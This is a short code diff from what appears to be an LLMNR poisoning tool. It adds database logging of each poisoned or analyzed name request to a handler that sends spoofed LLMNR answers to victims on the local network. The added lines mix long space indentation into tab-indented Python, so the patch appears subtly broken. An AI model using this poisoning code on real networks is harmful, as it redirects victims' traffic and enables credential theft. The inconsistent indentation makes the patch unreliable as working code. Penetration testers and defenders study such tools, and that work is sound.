@@ -62,13 +62,24 @@ class LLMNR(BaseRequestHandler):  # LLMNR Server class
 			if settings.Config.AnalyzeMode:
 				LineHeader = "[Analyze mode: LLMNR]"
 				print color("%s Request by %s for %s, ignoring" % (LineHeader, self.client_address[0], Name), 2, 1)
+                                SavePoisonersToDb({
+			                           'Poisoner': 'LLMNR', 
+			                           'SentToIp': self.client_address[0], 
+			                           'ForName': Name,
+			                           'AnalyzeMode': '1',
+		                                  })
 			else:  # Poisoning Mode
 				Buffer = LLMNR_Ans(Tid=data[0:2], QuestionName=Name, AnswerName=Name)
 				Buffer.calculate()
 				soc.sendto(str(Buffer), self.client_address)
 				LineHeader = "[*] [LLMNR]"
 				print color("%s  Poisoned answer sent to %s for name %s" % (LineHeader, self.client_address[0], Name), 2, 1)
-
+                                SavePoisonersToDb({
+			                           'Poisoner': 'LLMNR', 
+			                           'SentToIp': self.client_address[0], 
+			                           'ForName': Name,
+			                           'AnalyzeMode': '0',
+		                                  })
 			if Finger is not None:
 				print text("[FINGER] OS Version     : %s" % color(Finger[0], 3))
 				print text("[FINGER] Client Version : %s" % color(Finger[1], 3))
